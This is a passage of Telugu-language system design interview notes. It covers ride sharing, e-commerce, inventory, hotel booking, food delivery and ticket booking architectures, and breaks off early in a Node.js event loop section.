| **Reliability** | Versioning/Snapshots     | పొరపాటున డిలీట్ చేసినా రిస్టోర్ చేసుకోవచ్చు. |

---

**ముగింపు:** గూగుల్ డ్రైవ్ మరియు డ్రాప్‌బాక్స్ మధ్య ఉన్న అతిపెద్ద వ్యత్యాసం ఏమిటంటే—గూగుల్ డ్రైవ్ ఎక్కువగా **"Cloud-First"** (సర్వర్ లో ఉంటుంది), డ్రాప్‌బాక్స్ ఎక్కువగా **"Sync-First"** (మీ లోకల్ ఫోల్డర్ లో ఉండే ఫైల్స్ ని ప్రతి సెకను అప్‌డేట్ చేస్తుంది).

---

## Ride Sharing

మీరు అడిగిన **Ride-Sharing (Uber/Ola)** గురించి మనం ఆల్రెడీ క్లుప్తంగా మాట్లాడుకున్నాం. అయితే, మీరు దీనిని మళ్ళీ అడిగారు కాబట్టి, దీన్ని ఒక **ఎగ్జామ్ లేదా ఇంటర్వ్యూ పాయింట్ ఆఫ్ వ్యూలో** అత్యంత ముఖ్యమైన **"High-Level Components"** తో ఇక్కడ వివరంగా రాస్తున్నాను. ఇది మీకు క్విక్ రివిజన్‌లా ఉపయోగపడుతుంది.

---

### 1. కోర్ కాంపోనెంట్స్ (Architecture Design)

1. **Driver Location Service:** డ్రైవర్ల GPS లొకేషన్ ఎప్పటికప్పుడు అప్‌డేట్ అవుతుంది. (ఇది **Redis** లో స్టోర్ అవుతుంది, ఎందుకంటే చాలా ఫాస్ట్).
2. **Matching Service:** యూజర్ రిక్వెస్ట్ ఇచ్చినప్పుడు, దగ్గరలో ఉన్న డ్రైవర్లను వెతుకుతుంది. (ఇది **Geospatial Indexing** వాడి, కరెక్ట్ డ్రైవర్లను ఫిల్టర్ చేస్తుంది).
3. **Trip Management Service:** రైడ్ మొదలైనప్పటి నుండి ముగిసే వరకు జరిగే అన్ని యాక్టివిటీలను (Status updates) ట్రాక్ చేస్తుంది.
4. **Notification Service:** డ్రైవర్లకు అలర్ట్ పంపడం, యూజర్‌కి డ్రైవర్ రాకను తెలియజేయడం.

---

### 2. కీలకమైన సాంకేతిక పద్ధతులు (The Secret Sauce)

- **Geohashing (లొకేషన్ కోసం):**
- భూమిని చిన్న గ్రిడ్లుగా (Grids) విడగొట్టి, ప్రతి గ్రిడ్‌కు ఒక కోడ్ ఇస్తుంది.
- యూజర్ ఏ గ్రిడ్‌లో ఉన్నాడో, ఆ గ్రిడ్ మరియు చుట్టుపక్కల గ్రిడ్లలో ఉన్న డ్రైవర్లను మాత్రమే సర్వర్ చూస్తుంది. దీనివల్ల వేల మంది డ్రైవర్లలో అందరినీ చెక్ చేయనవసరం లేదు.

- **Quadtree (Alternative to Geohashing):**
- ఇది మ్యాప్‌ను ఒక చెట్టు (Tree) లాగా విడగొడుతుంది. ఏ ప్రాంతంలో ఎక్కువ మంది డ్రైవర్లు ఉంటే ఆ ఏరియాను ఎక్కువ ముక్కలు చేస్తుంది. (ఇది డైనమిక్‌గా పనిచేస్తుంది).

- **Race Condition Handling (Distrubuted Lock):**
- ఒకే రైడ్ కోసం ఇద్దరు డ్రైవర్లు "Accept" బటన్ నొక్కితే?
- **Solution:** **Redis Distributed Lock** వాడతాం. ఎవరు ముందు లాక్ చేస్తే, వాళ్లకే రైడ్ దక్కుతుంది.

---

### 3. రైడ్ లైఫ్ సైకిల్ (Workflow)

1. **Request:** యూజర్ తన లొకేషన్ ని పంపుతాడు.
2. **Find:** Matching Service, Redis లోని డ్రైవర్ లొకేషన్ల ఆధారంగా సమీపంలోని డ్రైవర్లకు **Push Notification** పంపుతుంది.
3. **Accept:** డ్రైవర్ యాక్సెప్ట్ చేయగానే, రైడ్ డీటెయిల్స్ క్రియేట్ అవుతాయి.
4. **Track:** డ్రైవర్ ఫోన్ నుండి వచ్చే **GPS Coordinates** ని **WebSocket** ద్వారా యూజర్ యాప్‌కు రియల్ టైమ్ లో పంపుతాము.
5. **End:** రైడ్ ముగియగానే, బిల్లు జనరేట్ అయ్యి ట్రిప్ క్లోజ్ అవుతుంది.

---

### 4. Bottlenecks (సమస్యలు - పరిష్కారాలు)

- **High Traffic:** పీక్ అవర్స్ (వర్షం పడేటప్పుడు) ట్రాఫిక్ విపరీతంగా పెరుగుతుంది. అప్పుడు **"Surge Pricing"** (డిమాండ్ బట్టి రేట్లు పెంచడం) లాజిక్ ని సర్వర్ రన్ చేస్తుంది.
- **Latency:** లొకేషన్ అప్‌డేట్స్ లో ఏమాత్రం లేట్ అవ్వకూడదు. అందుకే **UDP** ప్రోటోకాల్ వాడటం లేదా **WebSockets** కనెక్షన్ స్ట్రాంగ్‌గా మెయింటైన్ చేయడం చేస్తాం.

---

### Summary View

```text
[User App] <--> [API Gateway] <--> [Matching Service] <--> [Redis Geo-index]
                                           |
                                  [Trip Management] <--> [Cassandra DB]

```

ఇది ఒక సిస్టమ్ డిజైన్ ఇంటర్వ్యూలో మీరు చెప్పాల్సిన **"ప్రధానమైన ఆర్కిటెక్చర్"**. మీరు ఇక్కడ **Geohashing** గురించి మాట్లాడితే, ఇంటర్వ్యూయర్ కి మీరు ప్రాక్టికల్ గా ఆలోచిస్తున్నారని అర్థమవుతుంది.

---

## E-commerce Platform

**E-commerce Platform** (Amazon/Flipkart) డిజైన్ చేయడం అనేది సిస్టమ్ డిజైన్‌లో అత్యంత విస్తృతమైన సమస్య. ఇందులో **"Inventory"**, **"Orders"**, **"Payments"**, మరియు **"Search"** వంటి అనేకం కలిసి ఉంటాయి. దీనిని మనం మైక్రో సర్వీసెస్ ఆర్కిటెక్చర్ లో ఎలా డిజైన్ చేయాలో చూద్దాం.

---

### 1. Requirements (అవసరాలు)

- **Functional:** \* ప్రోడక్ట్ సెర్చ్ & డిస్కవరీ (Search & Filter).
- షాపింగ్ కార్ట్ & విష్‌లిస్ట్.
- ఆర్డర్ ప్లేస్‌మెంట్ & పేమెంట్.
- ఇన్వెంటరీ మేనేజ్‌మెంట్ (స్టాక్ చెకింగ్).

- **Non-Functional:**
- **High Availability:** సేల్స్ టైమ్ లో ట్రాఫిక్ విపరీతంగా ఉంటుంది.
- **Scalability:** కోట్లాది ప్రోడక్ట్స్, మిలియన్ల మంది యూజర్లు.
- **Consistency:** ఒక ప్రోడక్ట్ చివరిది ఉన్నప్పుడు, అది ఇద్దరికీ అమ్మకూడదు (Inventory consistency).

---

### 2. High-Level Design (సర్వీసెస్)

1. **Catalog Service:** ప్రోడక్ట్ వివరాలు, కేటగిరీలు, ఇమేజెస్ (NoSQL - MongoDB వాడవచ్చు).
2. **Search Service:** ప్రోడక్ట్స్ వెతకడానికి (Elasticsearch - ఇది చాలా ఫాస్ట్).
3. **Inventory Service:** ప్రోడక్ట్ స్టాక్ ఎంత ఉంది? (SQL/Redis వాడవచ్చు).
4. **Order Service:** ఆర్డర్ హిస్టరీ, ట్రాకింగ్.
5. **Cart Service:** యూజర్ యాడ్ చేసిన ఐటమ్స్.

---

### 3. Deep Dive (ముఖ్యమైన సవాళ్లు)

#### A. Inventory Consistency (The "Out of Stock" Problem)

సేల్ సమయంలో ఒక ప్రోడక్ట్ మీద అందరూ పడతారు. `UPDATE inventory SET count = count - 1` అని చేస్తే, డిబి (DB) లో లాకింగ్ ప్రాబ్లమ్స్ వస్తాయి.

- **Solution:** **Redis** వాడాలి. ప్రోడక్ట్ స్టాక్ ని Redis లో ఉంచి, ఆర్డర్ ప్లేస్ చేసేటప్పుడు `DECR` (Decrement) ఆపరేషన్ వాడాలి. ఇది చాలా ఫాస్ట్ మరియు అటామిక్.

#### B. Search Service (Elasticsearch)

కేవలం డేటాబేస్ లో వెతికితే సెర్చ్ స్లో అవుతుంది.

- **Solution:** **Elasticsearch**. ఇది టెక్స్ట్ సెర్చ్, ఫిల్టర్స్ (Price, Brand, Ratings) కి చాలా పవర్ ఫుల్. కొత్త ప్రోడక్ట్ యాడ్ అయిన ప్రతిసారీ ఇండెక్స్ అప్‌డేట్ అవుతుంది.

#### C. Order Placement (Saga Pattern)

ఆర్డర్ ప్లేస్ అవ్వడం అంటే చాలా పనులు జరగాలి:

1. Inventory తగ్గించాలి.
2. Payment ప్రాసెస్ అవ్వాలి.
3. Order కన్ఫర్మ్ అవ్వాలి.
   ఒకవేళ పేమెంట్ ఫెయిల్ అయితే, ఇన్వెంటరీని మళ్ళీ పెంచాలి. దీనికోసం **Saga Pattern** లేదా **Message Queue (Kafka)** ద్వారా ఈ ఈవెంట్స్ ని కంట్రోల్ చేస్తాం.

---

### 4. ఆర్కిటెక్చర్ ఫ్లో

1. **Browse:** యూజర్ సెర్చ్ చేస్తే -> **Search Service (Elasticsearch)** రిజల్ట్స్ ఇస్తుంది.
2. **Cart:** యాడ్ టు కార్ట్ క్లిక్ చేయగానే -> **Cart Service (Redis)** లో సేవ్ అవుతుంది.
3. **Checkout:** ఆర్డర్ క్లిక్ చేయగానే -> **Order Service** ద్వారా పేమెంట్ & ఇన్వెంటరీ సర్వీసులకు రిక్వెస్ట్ వెళ్తుంది.
4. **Completion:** అన్నీ సక్సెస్ అయితే -> ఆర్డర్ కన్ఫర్మ్ అవుతుంది -> యూజర్‌కి నోటిఫికేషన్ వెళ్తుంది.

---

### 5. Bottlenecks & Solutions

1. **Flash Sales:** బిలియన్ల రిక్వెస్టులు వస్తే?

- **Solution:** **Rate Limiting** (ఒక్కో యూజర్ కి ఇన్ని సెకనుకు రిక్వెస్టులు అని), మరియు **CDN** వాడి ఇమేజెస్ అన్నింటినీ క్యాష్ చేయడం.

2. **Database Sharding:** యూజర్ డేటాను ఏరియా వైస్ లేదా ఐడి వైస్ ముక్కలు (Sharding) చేయాలి.
3. **Microservices Communication:** ఇవన్నీ ఒకదానితో ఒకటి మాట్లాడుకోవడానికి **gRPC** (చాలా ఫాస్ట్) వాడాలి.

---

### Summary Table

| భాగం          | టెక్నాలజీ     | పని                             |
| ------------- | ------------- | ------------------------------- |
| **Search**    | Elasticsearch | ప్రోడక్ట్ సెర్చ్ & ఫిల్టర్స్.   |
| **Inventory** | Redis         | రియల్ టైమ్ స్టాక్ మేనేజ్‌మెంట్. |
| **Catalog**   | MongoDB       | ప్రోడక్ట్ మెటాడేటా.             |
| **Messaging** | Kafka         | ఆర్డర్ ప్రాసెసింగ్ ఈవెంట్స్.    |

---

**ముగింపు:** ఈ-కామర్స్ ప్లాట్‌ఫారమ్‌లో **"Inventory"** ని ఎలా మేనేజ్ చేస్తామో (Redis ద్వారా) అనేది మీరు ఇంటర్వ్యూలో చెబితే, మీకు చాలా మంచి మార్కులు వస్తాయి.

---

## Inventory System

**Inventory System (ఇన్వెంటరీ మేనేజ్‌మెంట్ సిస్టమ్)** అనేది ఏదైనా ఈ-కామర్స్ (Amazon), ఫుడ్ డెలివరీ (Swiggy), లేదా రీటైల్ స్టోర్లకు గుండెకాయ వంటిది. దీని ముఖ్య ఉద్దేశ్యం: **"ఏ ఐటమ్ ఎన్ని ఉన్నాయి, అవి ఎక్కడున్నాయి?"** అని కచ్చితంగా చెప్పడం.

దీనిని మనం ఒక ఇండస్ట్రీ-గ్రేడ్ సిస్టమ్ లాగా ఎలా డిజైన్ చేయాలో చూద్దాం:

---

### 1. Requirements (అవసరాలు)

- **Functional:** \* స్టాక్ అప్‌డేట్ (కొత్త స్టాక్ రావడం, అమ్మడం).
- ఐటమ్ రిజర్వేషన్ (ఆర్డర్ చేసినప్పుడు సీటు/ఐటమ్ లాక్ చేయడం).
- లో-స్టాక్ అలర్ట్స్ (స్టాక్ తక్కువగా ఉంటే మేనేజర్‌కి మెసేజ్ వెళ్లడం).
- మల్టిపుల్ వేర్‌హౌస్ సపోర్ట్.

- **Non-Functional:**
- **High Consistency:** స్టాక్ కౌంట్ ఎప్పుడూ తప్పుగా చూపించకూడదు.
- **High Throughput:** ప్రతి సెకనుకు వేలకొద్దీ ఆర్డర్లు వస్తున్నప్పుడు స్టాక్ అప్‌డేట్ అవ్వాలి.

---

### 2. High-Level Design & Logic

ఇన్వెంటరీలో మెయిన్ ఛాలెంజ్ **"Concurrency"**. ఒకే ఐటమ్ చివరిది ఉన్నప్పుడు ఇద్దరు కస్టమర్లు ఒకేసారి ఆర్డర్ చేస్తే, ఎవరికి దక్కాలి?

1. **Inventory Service:** మొత్తం లాజిక్ ఇక్కడే ఉంటుంది.
2. **Database (RDBMS + Cache):** స్టాక్ డేటా కోసం SQL, ఫాస్ట్ యాక్సెస్ కోసం Redis.
3. **Reservation Engine:** ఆర్డర్ మొదలవ్వగానే సీటు/ఐటమ్ ని 5-10 నిమిషాల పాటు "Reserve" చేస్తుంది.

---

### 3. Deep Dive (ముఖ్యమైన సవాళ్లు)

#### A. Race Conditions & Locking

ఒక ఐటమ్ స్టాక్ 1 ఉన్నప్పుడు, ఇద్దరు యూజర్లు క్లిక్ చేస్తే?

- **Pessimistic Locking (DB Level):** ఆర్డర్ చేసేటప్పుడు `SELECT ... FOR UPDATE` వాడతాం. ఇది ఆ రో (Row) ని లాక్ చేస్తుంది, ఇంకెవరూ అప్‌డేట్ చేయలేరు. ఇది సేఫ్ కానీ స్లో.
- **Optimistic Locking (Version Check):** `UPDATE items SET count = count - 1 WHERE id = 1 AND version = 5`. ఒకవేళ వేరేవాళ్ళు అప్‌డేట్ చేస్తే, వర్షన్ మారిపోతుంది కాబట్టి, ఈ అప్‌డేట్ ఫెయిల్ అవుతుంది. ఇది ఫాస్ట్.
- **Redis Atomic Counters:** అత్యంత ఫాస్ట్ మెథడ్. `DECR` కమాండ్ వాడి స్టాక్ తగ్గిస్తాం. నెగటివ్ స్టాక్ రాకుండా Redis చూసుకుంటుంది.

#### B. Distributed Inventory (మల్టిపుల్ వేర్‌హౌస్)

ఒకవేళ మనకు 5 వేర్‌హౌస్లు ఉంటే? యూజర్ ఉన్న లొకేషన్‌కి దగ్గర్లో ఏ వేర్‌హౌస్ ఉందో అక్కడి స్టాక్ మాత్రమే తగ్గించాలి. దీనిని **Sharding** అంటారు.

#### C. Handling Over-selling

చాలాసార్లు సిస్టమ్ అప్‌డేట్ అయ్యేలోపు, ఆల్రెడీ అమ్ముడైన ఐటమ్ ని మళ్ళీ అమ్మేస్తారు.

- **Solution:** **"Reservation Bucket"**. ఆర్డర్ కన్ఫర్మ్ అవ్వకముందే ఐటమ్ ని టెంపరరీగా రిజర్వ్ చేయడం. పేమెంట్ ఫెయిల్ అయితే, మళ్ళీ దాన్ని "Available" కి మార్చడం.

---

### 4. ఆర్కిటెక్చర్ ఫ్లో

1. **Request:** యూజర్ ఆర్డర్ క్లిక్ చేస్తాడు.
2. **Reservation:** **Inventory Service (Redis)** లో ఆ ఐటమ్ ని టెంపరరీ లాక్ (Reserve) చేస్తుంది.
3. **Payment:** పేమెంట్ సక్సెస్ అవ్వగానే, **Kafka** ద్వారా ఇన్వెంటరీ అప్‌డేట్ సర్వీస్ కి మెసేజ్ వెళ్తుంది.
4. **Decrement:** ఇన్వెంటరీ సర్వీస్ పర్మనెంట్ గా **SQL DB** లో స్టాక్ తగ్గిస్తుంది.
5. **Release:** ఒకవేళ పేమెంట్ ఫెయిల్ అయితే, రిజర్వేషన్ రిలీజ్ అయి స్టాక్ మళ్ళీ పెరుగుతుంది.

---

### 5. Summary Architecture Table

| కాన్సెప్ట్      | టెక్నాలజీ           | పని                                           |
| --------------- | ------------------- | --------------------------------------------- |
| **Consistency** | SQL (ACID)          | కచ్చితమైన స్టాక్ లెక్కలు.                     |
| **Speed**       | Redis (Atomic DECR) | సేల్ సమయంలో ఫాస్ట్ అప్‌డేట్స్.                |
| **Integrity**   | Saga Pattern        | ఆర్డర్ ఫెయిల్ అయితే స్టాక్ తిరిగి యాడ్ చేయడం. |
| **Alerting**    | Pub/Sub (Kafka)     | లో-స్టాక్ అలర్ట్స్ పంపడం.                     |

---

**ముగింపు:** ఇన్వెంటరీ సిస్టమ్ లో **"Reservation"** మరియు **"Atomic Updates"** అనేవి కీలకం. మీరు ఇంటర్వ్యూలో "Pessimistic vs Optimistic Locking" గురించి చెబితే, మీరు ఒక సీనియర్ డెవలపర్ లాగా కనిపిస్తారు.

---

## Hotel Booking

**Hotel Booking System (ఉదాహరణకు: Booking.com, MakeMyTrip)** డిజైన్ చేయడం అనేది **Inventory Management** (గదులు) మరియు **Concurrency Control** (ఒక గదిని ఇద్దరు బుక్ చేయకుండా చూడటం) ల కలయిక.

దీనిని 4 ప్రధాన భాగాలుగా విభజించి చూద్దాం:

---

### 1. Requirements (అవసరాలు)

- **Functional:** \* హోటల్ సెర్చ్ & డిస్కవరీ (లొకేషన్, డేట్స్, ప్రైస్).
- రూమ్ అవైలబిలిటీ చెక్ చేయడం.
- రూమ్ బుకింగ్ (Booking & Payment).
- క్యాన్సిలేషన్ & రీఫండ్.

- **Non-Functional:**
- **High Consistency:** ఒక గదికి ఒకే బుకింగ్ ఉండాలి.
- **High Availability:** ఫెస్టివల్ సీజన్స్ లో లోడ్ తట్టుకోవాలి.
- **Low Latency:** సెర్చ్ రిజల్ట్స్ వేగంగా రావాలి.

---

### 2. High-Level Design (సర్వీసెస్)

1. **Search Service:** హోటల్స్ లిస్ట్, ఫిల్టర్స్ (Elasticsearch వాడటం ఉత్తమం).
2. **Booking Service:** బుకింగ్ ప్రాసెస్ & స్టేటస్ మేనేజ్మెంట్.
3. **Inventory Service:** ఏ డేట్స్ లో ఏ గదులు ఖాళీగా ఉన్నాయి (Availability Engine).
4. **Payment Service:** పేమెంట్ గేట్‌వే ఇంటిగ్రేషన్.

---

### 3. Deep Dive (ముఖ్యమైన సవాళ్లు)

#### A. Availability Engine (అతి కీలకమైనది)

ఒక హోటల్‌లో 50 గదులు ఉన్నాయనుకుంటే, అవి ఏయే డేట్స్ లో ఖాళీగా ఉన్నాయో ట్రాక్ చేయడం చాలా కష్టం.

- **Solution:** **Bitmaps** లేదా **Time-series database** వాడతారు.
- ఉదా: ప్రతి గదికి ఒక 365 బిట్ల పొడవైన స్ట్రింగ్ ఉంటుంది. 0 ఉంటే ఖాళీ, 1 ఉంటే బుక్ అయిందని అర్థం. ఇది చాలా వేగంగా అవైలబిలిటీ చెక్ చేయడానికి ఉపయోగపడుతుంది.

#### B. Double Booking Control

ఒకే గదిని ఇద్దరు యూజర్లు ఒకేసారి బుక్ చేస్తే?

- **Pessimistic Locking:** యూజర్ "Book Now" క్లిక్ చేయగానే, ఆ హోటల్ రూమ్ రో (Row) మీద DB లాక్ వేస్తుంది. పేమెంట్ పూర్తయ్యాక లాక్ రిలీజ్ అవుతుంది.
- **Redis Locks:** డేటాబేస్ మీద భారం తగ్గించడానికి, Redis లో `SetNX` (Set if Not Exists) కమాండ్ వాడి తాత్కాలిక లాక్ పెడతాం.

#### C. Search Scalability

హోటల్ సెర్చ్ లో ఫిల్టర్లు (Price, Star Rating, Amenities) చాలా ఉంటాయి.

- **Solution:** అన్నింటినీ **Elasticsearch** లో ఇండెక్స్ చేస్తాం. ఇది `Geospatial search` (నాకు దగ్గర్లో ఉన్న హోటల్స్) కి చాలా పవర్ ఫుల్.

---

### 4. ఆర్కిటెక్చర్ ఫ్లో

1. **Search:** యూజర్ డేట్స్ & లొకేషన్ ఇస్తాడు -> **Search Service** (Elasticsearch) నుండి రిజల్ట్స్ వస్తాయి.
2. **Availability Check:** హోటల్ క్లిక్ చేయగానే -> **Inventory Service** (Redis/DB) నుండి ఆ డేట్స్ లో గదులు ఉన్నాయా లేదా చూస్తుంది.
3. **Lock/Book:** యూజర్ బుక్ చేయగానే -> **Booking Service** Redis లాక్ పెడుతుంది.
4. **Payment:** పేమెంట్ సక్సెస్ అయ్యాక -> **Booking Service** ఆ బుకింగ్‌ని కన్ఫర్మ్ చేస్తుంది.

---

### 5. Bottlenecks & Solutions

1. **Concurrency during Holidays:** పండగల టైమ్‌లో ట్రాఫిక్ ఎక్కువ ఉంటుంది. -> **Rate Limiting** వాడి సర్వర్ ఓవర్‌లోడ్ అవ్వకుండా చూస్తాం.
2. **Database Overload:** ప్రతి సెర్చ్ కి డేటాబేస్ ని అడగలేం. -> **Redis Cache** వాడి పాపులర్ హోటల్స్ డేటాని క్యాష్ లో ఉంచుతాం.
3. **Data Integrity:** పేమెంట్ ఫెయిల్ అయితే, రూమ్ బుకింగ్ క్యాన్సిల్ అవ్వాలి. -> **Saga Pattern** (Distributed Transactions) వాడతాం.

---

### Summary Table

| భాగం             | టెక్నాలజీ                | పని                               |
| ---------------- | ------------------------ | --------------------------------- |
| **Search**       | Elasticsearch            | ఫిల్టర్స్, లొకేషన్ బేస్డ్ సెర్చ్. |
| **Availability** | Redis (Bitmaps/Counters) | ఖాళీ గదుల రియల్-టైమ్ స్టేటస్.     |
| **Transactions** | PostgreSQL (ACID)        | కచ్చితమైన బుకింగ్ రికార్డ్స్.     |
| **Locking**      | Redis Distributed Lock   | డబుల్ బుకింగ్ ని నివారించడం.      |

---

**ముగింపు:** హోటల్ బుకింగ్ సిస్టమ్ లో **"Availability Check"** వేగంగా జరగడం చాలా ముఖ్యం. దీనికోసం మీరు **Bitmaps** కాన్సెప్ట్ గురించి ఇంటర్వ్యూలో మెన్షన్ చేస్తే, మీకు చాలా మంచి ఇంప్రెషన్ ఉంటుంది.

---

## Food Delivery

ఫుడ్ డెలివరీ యాప్ (Zomato/Swiggy వంటివి) డిజైన్ చేయడం అనేది చాలా ఆసక్తికరమైన సిస్టమ్ డిజైన్ సవాలు. ఇది ఒక **"Hyperlocal Three-Sided Marketplace"**, అంటే ఇందులో కస్టమర్లు, రెస్టారెంట్లు మరియు డెలివరీ పార్టనర్లు అనే మూడు ముఖ్యమైన విభాగాలు ఉంటాయి.

దీనిని మీరు ఇంటర్వ్యూలో వివరించడానికి అనువైన **High-Level Design** ఇక్కడ ఉంది:

### 1. ప్రధాన సర్వీసులు (Core Services)

సిస్టమ్‌ను చిన్న చిన్న భాగాలుగా (Microservices) విభజించాలి:

- **Discovery Service:** యూజర్ లొకేషన్ ఆధారంగా దగ్గర్లోని రెస్టారెంట్లను చూపించడం. (ఇక్కడ **Geohashing** లేదా **Redis Geo** వాడటం ముఖ్యం).
- **Order Management Service:** ఆర్డర్ లైఫ్-సైకిల్ (Pending -> Confirmed -> Cooking -> Picked -> Delivered) ట్రాక్ చేయడం.
- **Delivery/Dispatch Service:** దగ్గర్లోని డెలివరీ పార్టనర్‌ను వెతికి, ఆర్డర్ అసైన్ చేయడం.
- **Payment Service:** పేమెంట్ ప్రాసెసింగ్ మరియు రీఫండ్స్.
- **Notification Service:** ఆర్డర్ స్టేటస్ అప్‌డేట్స్ పంపడం.

### 2. కీలకమైన సవాళ్లు (Critical Challenges)

ఈ సిస్టమ్‌లో మీరు ప్రత్యేకంగా వీటి గురించి మాట్లాడాలి:

- **Geospatial Queries:** యూజర్ లొకేషన్ నుండి 5 కి.మీ పరిధిలో ఉన్న రెస్టారెంట్లను సెకనులోపు చూపాలి. దీనికి **Elasticsearch** (సెర్చ్ కోసం) మరియు **Redis** (రియల్ టైమ్ డేటా కోసం) వాడాలి.
- **Concurrency (Double Assignment):** ఒక ఆర్డర్ ఒకేసారి ఇద్దరు డెలివరీ పార్టనర్లకు వెళ్లకూడదు. దీనిని నివారించడానికి **Distributed Locking** (Redis) వాడాలి.
- **Real-time Tracking:** డెలివరీ పార్టనర్ లొకేషన్ ని యూజర్‌కి చూపించడానికి **WebSockets** వాడాలి. ఇది తక్కువ లేటెన్సీతో అప్‌డేట్స్ పంపుతుంది.

### 3. ఆర్కిటెక్చర్ ఫ్లో

1. **User Request:** యూజర్ లొకేషన్ పంపుతాడు -> డిస్కవరీ సర్వీస్ రెస్టారెంట్లను చూపిస్తుంది.
2. **Order Placement:** యూజర్ ఆర్డర్ ఇస్తాడు -> ఆర్డర్ సర్వీస్ క్రియేట్ అవుతుంది.
3. **Dispatch:** డెలివరీ సర్వీస్ సమీపంలో ఉన్న డ్రైవర్లకు నోటిఫికేషన్ పంపుతుంది.
4. **Lifecycle:** డ్రైవర్ ఆర్డర్ తీసుకున్నప్పటి నుండి, డెలివరీ అయ్యే వరకు ప్రతి స్టేటస్ అప్‌డేట్ **Message Queue (Kafka)** ద్వారా అందరికీ తెలుస్తుంది.

### 4. స్కేలబిలిటీ (Scalability)

- **Flash Sales/Peak Hours:** లంచ్ లేదా డిన్నర్ టైమ్‌లో ట్రాఫిక్ విపరీతంగా పెరుగుతుంది. అప్పుడు **Load Balancers** మరియు **Auto-scaling** అవసరం.
- **Consistency:** ఆర్డర్ స్టేటస్ అప్‌డేట్ అయ్యేటప్పుడు డేటా ఎప్పుడూ కచ్చితంగా ఉండాలి (ACID properties).

---

## Ticket Booking

టికెట్ బుకింగ్ సిస్టమ్ (ఉదాహరణకు: **BookMyShow** లేదా **IRCTC**) డిజైన్ చేయడం అనేది సిస్టమ్ డిజైన్‌లో ఒక **"Inventory Management"** మరియు **"Concurrency Control"** సవాలు.

దీనిని అర్థం చేసుకోవడానికి 4 ముఖ్యమైన భాగాలు చూద్దాం:

### 1. ప్రధాన అవసరాలు (Requirements)

- **High Concurrency:** ఒకే సినిమా లేదా ట్రైన్ టికెట్ల కోసం లక్షల మంది ఒకేసారి ట్రై చేస్తారు.
- **Consistency:** ఒక సీటును ఇద్దరు వ్యక్తులు ఒకేసారి బుక్ చేయకూడదు (Double Booking నివారించాలి).
- **Availability:** బుకింగ్ సిస్టమ్ ఎప్పుడూ అందుబాటులో ఉండాలి.

### 2. కీలకమైన సవాళ్లు & పరిష్కారాలు

#### A. సీట్ లాకింగ్ (Seat Locking)

యూజర్ సీటును సెలెక్ట్ చేయగానే, అది ఇంకెవరికీ కనిపించకుండా **"Lock"** అవ్వాలి.

- **Solution:** **Redis** అనే మెమరీ-స్టోరేజ్‌ని వాడాలి. యూజర్ సీటును క్లిక్ చేయగానే, Redisలో ఆ సీటుకి 5-10 నిమిషాల పాటు తాత్కాలిక లాక్ పడుతుంది. ఈ సమయంలో పేమెంట్ పూర్తి చేయాలి.

#### B. డబుల్ బుకింగ్ నివారించడం (No Double Booking)

ఇద్దరు యూజర్లు ఒకే సెకనులో అదే సీటును బుక్ చేయడానికి క్లిక్ చేస్తే?

- **Solution:** డేటాబేస్ స్థాయిలో **"Database Constraint"** (Unique Key) వాడాలి. ఒకవేళ ఇద్దరూ క్లిక్ చేసినా, సర్వర్ ముందుగా ఎవరికి లాక్ దొరికితే వారి పేమెంట్ ప్రాసెస్ చేస్తుంది, రెండో వ్యక్తికి "సీటు అందుబాటులో లేదు" అని చూపిస్తుంది.

#### C. రియల్-టైమ్ స్టేటస్

సీట్లు బుక్ అయినప్పుడు మిగతా యూజర్లకు అది రియల్-టైమ్ లో తెలియాలి.

- **Solution:** **WebSockets** లేదా **Polling** ద్వారా యూజర్ యాప్‌లో సీట్ మ్యాప్‌ను ఎప్పటికప్పుడు అప్‌డేట్ చేస్తాం.

### 3. ఆర్కిటెక్చర్ ఫ్లో (Architecture Flow)

1. **Browse:** యూజర్ సినిమా/ట్రైన్ సెలెక్ట్ చేయగానే, **Inventory Service** నుండి ఏ సీట్లు ఖాళీగా ఉన్నాయో చూపిస్తుంది.
2. **Lock:** సీటు సెలెక్ట్ చేయగానే, **Booking Service** ద్వారా Redisలో ఆ సీటుకి లాక్ పడుతుంది.
3. **Payment:** యూజర్ పేమెంట్ గేట్‌వే ద్వారా డబ్బులు చెల్లిస్తాడు.
4. **Confirm:** పేమెంట్ సక్సెస్ అవ్వగానే, **Transaction Service** ఆ సీటును పర్మనెంట్ గా బుక్ చేస్తుంది (Sold Status).

### 4. బాటిల్-నెక్స్ (Bottlenecks)

- **Traffic Spikes:** కొత్త సినిమా రిలీజ్ అయినప్పుడు ట్రాఫిక్ ఎక్కువగా ఉంటుంది. దీనిని తట్టుకోవడానికి **Message Queue (Kafka)** వాడతాము. యూజర్ రిక్వెస్టులను క్యూలో పెట్టి, ఒకటి తర్వాత ఒకటి ప్రాసెస్ చేస్తాం. తద్వారా సిస్టమ్ క్రాష్ అవ్వదు.

---

**ముగింపు:**
టికెట్ బుకింగ్ సిస్టమ్‌లో అతి ముఖ్యమైనది **"అటామిక్ ట్రాన్సాక్షన్" (Atomic Transaction)**. అంటే బుకింగ్ జరగడం లేదా ఫెయిల్ అవ్వడం - ఈ రెండింటిలో ఏదో ఒకటి జరగాలి, మధ్యలో ఆగిపోకూడదు.

---

# 18: Language-Specific Backend (Node.js)

---

## Event Loop

Node.js లో **Event Loop** అనేది ఒక "మేనేజర్" లాంటిది. ఇది సర్వర్‌కి వచ్చే ప్రతి పనిని (Task) ఏ ఆర్డర్‌లో ప్రాసెస్ చేయాలో నిర్ణయిస్తుంది. Node.js సింగిల్-థ్రెడెడ్ (Single-threaded) అయినా, ఈ Event Loop వల్లే ఇది వేలకొద్దీ రిక్వెస్టులను చాలా వేగంగా హ్యాండిల్ చేయగలుగుతుంది.

### ఇది ఎలా పనిచేస్తుంది?

Node.js లో ఏదైనా పని (ఉదా: ఫైల్ రీడ్ చేయడం లేదా డేటాబేస్ క్వెరీ) జరిగినప్పుడు, అది సర్వర్ మెయిన్ థ్రెడ్‌ని బ్లాక్ చేయదు. దానికి బదులుగా, ఆ పనిని పక్కన పెట్టి **Event Loop** తన తదుపరి పనిని చూసుకుంటుంది. ఆ పని పూర్తయ్యాక, దాని ఫలితాన్ని (Callback) తీసుకొని మళ్ళీ మెయిన్ థ్రెడ్ లో ఎగ్జిక్యూట్ చేస్తుంది.

### Event Loop లోని దశలు (Phases)

1. **Timers:** `setTimeout()` మరియు `setInterval()` ద్వారా ఇచ్చిన ఫంక్షన్లు ఇక్కడ రన్ అవుతాయి.
2. **Pending Callbacks:** సిస్టమ్ ఆపరేషన్లకు సంబంధించిన callbacks ఇక్కడ ప్రాసెస్ అవుతాయి.
